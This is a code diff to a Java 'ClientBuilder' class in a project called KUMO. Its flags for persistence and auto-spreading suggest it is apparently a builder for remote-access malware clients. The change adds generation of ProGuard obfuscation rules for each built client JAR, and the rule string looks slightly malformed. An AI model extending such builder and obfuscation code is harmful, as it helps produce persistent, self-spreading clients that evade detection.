@@ -1,15 +1,13 @@
 package KUMO;
 
+import GUI.Views.AlertView;
 import Logger.Level;
 import Logger.Logger;
 import Server.Data.FileUtils;
 import Server.Data.PseudoBase;
 
 import java.awt.*;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.ArrayList;
 import java.util.jar.Attributes;
 import java.util.jar.JarEntry;
@@ -20,6 +18,7 @@ public class ClientBuilder {
     public static boolean isPersistent = false;
     public static boolean autoSpread = false;
     public static boolean isDebug = false;
+    public static boolean createProguard = false;
     private String clientName;
     public static String jarCreatedBy = "";
     public static String jarVersion = "1.0";
@@ -91,11 +90,35 @@ public class ClientBuilder {
             }
             out.close();
             stream.close();
+            createProguardRules(jarFileName);
             Desktop.getDesktop().open(new File(System.getProperty("user.home") + "/Kumo/"));
             Logger.log(Level.INFO, "Build Complete!");
             FileUtils.deleteFiles();
         } catch (Exception e) {
             Logger.log(Level.ERROR, e.toString());
+        }
+    }
+
+    public static void createProguardRules(String inJarName){
+        PrintWriter pw = null;
+        try {
+            File proguardFile = new File(System.getProperty("user.home") + File.separator + "Kumo" + File.separator + "proguard-rules.pro");
+            System.out.println(proguardFile.getAbsolutePath());
+            proguardFile.createNewFile();
+            String rules = "-injars " + inJarName + ".jar\n" +
+                    "-outjars " + inJarName + "-obfuscated.jar\n" +
+                    "-target 1.8\n" +
+                    "-libraryjars <java.home>\\jre\\lib\"\n" +
+                    " -overloadaggressively\n" +
+                    "-keep class * { public static void main(java.lang.String[]);}\n" +
+                    "-optimizationpasses 3\n" +
+                    "-allowaccessmodification\n" +
+                    "-keepparameternames";
+            pw = new PrintWriter(proguardFile);
+            pw.write(rules);
+            pw.close();
+        } catch (IOException ioe){
+            new AlertView().showErrorAlert("Could not create proguard rules: " + ioe.getMessage());
         }
     }
 }
